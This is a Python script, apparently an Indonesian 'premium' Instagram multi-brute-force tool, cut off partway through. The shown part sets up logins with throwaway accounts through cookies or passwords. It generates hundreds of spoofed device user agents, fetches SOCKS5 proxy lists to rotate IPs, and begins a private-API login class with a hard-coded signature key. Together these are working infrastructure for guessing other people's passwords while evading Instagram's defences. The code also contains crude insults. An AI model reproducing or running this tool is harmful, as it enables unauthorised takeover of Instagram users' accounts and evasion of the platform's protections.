#BrayennnXD ComeBack
#BrayennnXD Nih Bosss
#Jangan Lupa Besyukur :)


try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import urllib.request
	import calendar
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		print(' tidak dapat menginstall module rich, coba install manual (pip install rich)')
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import time
from rich.progress import track
from rich.tree import Tree
from rich import print as prints
from rich import print as rprint
from rich.table import Table as me

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
console = Console()
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://z-p42.www.instagram.com/'
menudump=[]
prox_xyaa=[]

CY='\033[96;1m'
H='\33[32;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
#WARNA rick(kotak)
HH = "[#000000]" # Hitam
MM = "[#FF0000]" # Merah
II = "[#00FF00]" # Hijau
KK = "[#FFFF00]" # Kuning
BB = "[#00C8FF]" # Biru
UU = "[#AF00FF]" # Ungu
PP = "[#FF00FF]" # Pink
CC = "[#00FFFF]" # Biru Muda
QQ = "[#FFFFFF]" # Putih
JJ = "[#FF8F00]" # Jingga
AA = "[#AAAAAA]" # Abu-Abu
OO = "[#FFA500]" # OREN
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#afafff]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#afafff"

def change_theme():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. change theme color red    [{color_rich}06{P2}]. change theme color pink
[{color_rich}02{P2}]. change theme color green  [{color_rich}07{P2}]. change theme color L blue
[{color_rich}03{P2}]. change theme color yellow [{color_rich}08{P2}]. change theme color white
[{color_rich}04{P2}]. change theme color blue   [{color_rich}09{P2}]. change theme color orange
[{color_rich}05{P2}]. change theme color violet [{color_rich}10{P2}]. change theme color gray""",width=80,padding=(0,4),style=f"{color_table}"))
	them = input(f" {N}choose theme : ")
	if them in["1","01"]:
		open("data/color_rich.txt","w").write("[#FF0000]")
		open("data/color_table.txt","w").write("#FF0000")
	elif them in["2","02"]:
		open("data/color_rich.txt","w").write("[#00FF00]")
		open("data/color_table.txt","w").write("#00FF00")
	elif them in["3","03"]:
		open("data/color_rich.txt","w").write("[#FFFF00]")
		open("data/color_table.txt","w").write("#FFFF00")
	elif them in["4","04"]:
		open("data/color_rich.txt","w").write("[#00C8FF]")
		open("data/color_table.txt","w").write("#00C8FF")
	elif them in["5","05"]:
		open("data/color_rich.txt","w").write("[#AF00FF]")
		open("data/color_table.txt","w").write("#AF00FF")
	elif them in["6","06"]:
		open("data/color_rich.txt","w").write("[#FF00FF]")
		open("data/color_table.txt","w").write("#FF00FF")
	elif them in["7","07"]:
		open("data/color_rich.txt","w").write("[#00FFFF]")
		open("data/color_table.txt","w").write("#00FFFF")
	elif them in["8","08"]:
		open("data/color_rich.txt","w").write("[#FFFFFF]")
		open("data/color_table.txt","w").write("#FFFFFF")
	elif them in["9","09"]:
		open("data/color_rich.txt","w").write("[#FF8F00]")
		open("data/color_table.txt","w").write("#FF8F00")
	elif them in["10"]:
		open("data/color_rich.txt","w").write("[#AAAAAA]")
		open("data/color_table.txt","w").write("#AAAAAA")
	time.sleep(2)
	prints(Panel("[white]berhasil mengganti tema, silahkan jalankan ulang scriptnya python run.py",style=f"{color_table}"));time.sleep(2);exit()

USN="Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 Instagram 24.0.0.12.201 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-G930F; herolte; samsungexynos8890; pt_PT)"
USN="Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A3003 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 92.0.0.15.114 Android (26/8.0.0; 420dpi; 1080x1920; OnePlus; ONEPLUS A3003; OnePlus3T; qcom; de_DE; 153386780)"
USN="Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro Build/SQ3A.220705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 Instagram 244.0.0.17.110 Android (32/12; 560dpi; 1440x2934; Google/google; Pixel 6 Pro; raven; raven; en_AU; 383877306)"

internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
method=[]
s=requests.Session()
uaxz=[]
xxkontol=[]
axz=[]
oppo=[]
for tu in range(1000):
            a = random.choice([
            'CPH1853',
            'CPH1803',
            'CPH1893',
            'CPH2071',
            'CPH1717',
            'CPH1937',
            'CPH1923',
            'CPH1725',
            'CPH1909',
            'CPH1613',
            'CPH1989',
            'CPH1907',
            'CPH2015',
            'CPH2083'])
            b = random.randrange(73, 99)
            c = random.randrange(4200, 4900)
            d = random.randrange(40, 150)
            e = random.choice([
            'my-zg',
            'en-us',
            'en-gb',
            'en-au',
            'th-th',
            'hi-in',
            'zh-tw',
            'in-id',
            'ru-ru',
            'vi-vn',
            'zh-cn'])
            f = random.choice([
            '9',
            '10',
            '11',
            '12',
            '5.1',
            '4.4.4',
            '8.1.0',
            '7.1.1',
            '6.0.1',
            '5.1.1'])
            g = random.randrange(4,99)
            h = random.randrange(3,10)
            i = random.randrange(111111,199999)
            j = random.randrange(1,9)
            ugens_xyaa = f'Mozilla/5.0 (Linux; U; Android {f}; {e}; {a} SM-G965N Build/QP1A.190711.020; {i}.0{j}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36 OppoBrowser/{g}.{h}.1.{h}'
            oppo.append(ugens_xyaa)
try:
    proxs_xyaa = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all").text
    for xc_team in proxs_xyaa.splitlines():prox_xyaa.append(xc_team)
except:prints(Panel(f'{P2}Sinyal Lu lag Tod Kalo Dah Bagus coba lagi masuk ke tools',width=80,style=f"{color_table}"));exit()

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "selamat pagi"
	elif 12 <= hours < 15:timenow = "selamat siang"
	elif 15 <= hours < 18:timenow = "selamat sore"
	else:timenow = "selamat malam"
	return timenow

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03)
		
warnaa = random.choice([M,H,K,U,O])
kontolwarna = random.choice([M,H,K,U,O])
wr = random.choice([M,K,H,U,O])
kontol_rich = random.choice([K2,M2,H2,U2,B2,O2,J2])

# BANNER
def banner():
	os.system("clear")
	prints(Panel(f"{P2}\tSELAMAT DATANG DI TOLS {color_rich}'Instagram'{P2} MULTI BRUTE FORCE IG",width=80,padding=(0,4),style=f"{color_table}"))
	prints(Panel(f'''{O2}                     " PREMIUM | Hanzzz"{color_rich}
_____ _____________  ____________________ {H2}•{P2} Author  : Hana X Ganss {color_rich}
__  // /__  /___   |/  /__  __ )__  ____/ {H2}•{P2} Facebook: Malezz Isi {color_rich}
_  // /__  / __  /|_/ /__  __  |_  /_     {H2}•{P2} Status  : {H2}Prem{color_rich}
/__  __/  /___  /  / / _  /_/ /_  __/     {H2}•{P2} Whatsap : 085786215554{color_rich}
  /_/  /_____/_/  /_/  /_____/ /_/        {H2}•{P2} Version : 1.0 ''',width=80,padding=(0,2),style=f"{color_table}"))

def process_data():
    sleep(0.08)
    	
try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus
 

def cekAPI(cookie):
    user=open('data/.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        prints(Panel(f"{P2}Akun Lu Cp Kontol, Login Pake Akun Larn.",width=80,style=f"{color_table}"));os.system('rm -rf data/.kukis.log rm -rf data/.username');exit()

    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('data/.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            prints(Panel(f"{P2}disarankan login menggunakan cookie agar terhindar dari checkpoint akun",width=80,padding=(0,2),style=f"{color_table}"))
            prints(Panel(f"{P2}[{color_rich}1{P2}]. login menggunakan cookie ( {H2}disarankan{P2} )\n{P2}[{color_rich}2{P2}]. login menggunakan username & password\n{P2}[{color_rich}3{P2}]. keluar ( {M2}tools {P2})",width=80,padding=(0,4),style=f"{color_table}"))
            loginpil=input(f"input 1 sampai 3 : ")
            if loginpil=='':prints(Panel(f"{P2}jangan kosong broo!!! pilih salah satu yang di atas",width=80,padding=(0,4),style=f"{color_table}"));exit()
            if loginpil=='1':
                prints(Panel(f"{P2}sebelum login pastikan akun tumbal bersifat publik dan bukan private",width=80,padding=(0,4),style=f"{color_table}"))
                us=input(f'masukan username Lu : ')
                cok=input(f'masukan cookie   : ')
                for _ in track(range(100), description=f'{P2}tunggu sedang login...'):process_data()
                kuki=open('data/.kukis.log','w').write(cok)
                user=open('data/.username','w').write(us)
                prints(Panel(f"{P2}login akun tumbal berhasil, silahkan jalankan ulang scriptnya",width=80,padding=(0,7),style=f"{color_table}"));exit()
            elif loginpil == '2':
                login()
            elif loginpil == '3':
                prints(Panel(f"{P2}terima kasih telah menggunakan script ini {color_rich}'InstaXC'{P2} semoga hari² kamu menyenangkan",width=80,padding=(0,3),style=f"{color_table}"));time.sleep(2);exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        lisensi()
def login():
	global external
	try:
		prints(Panel(f"{P2}sebelum login pastikan akun tumbal bersifat publik dan bukan private",width=80,padding=(0,4),style=f"{color_table}"))
		us=input(f' masukan username : ')
		pw=input(f' masukan password : ')
	except KeyboardInterrupt:
		print(f' keyboardinterrupt terdeteksi... keluar !')
		exit()
	x=instagramAPI(us,pw).loginAPI()
	if x.get('status')=='success':
		open('data/.username','a').write(us)
		open('data/.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		prints(Panel(f"{P2}login akun tumbal berhasil, silahkan jalankan ulang scriptnya",width=80,padding=(0,7),style=f"{color_table}"));exit()
	elif x.get('status')=='checkpoint':
		prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"{color_table}"));os.system("rm -rf data/.kukis.log rm -rf data/.username");exit()
	else:
		prints(Panel(f"{P2}Username atau pw lu salah todi",width=80,padding=(0,1),style=f"{color_table}"))
		time.sleep(2);exit()

def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://z-p42.www.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://z-p42.www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
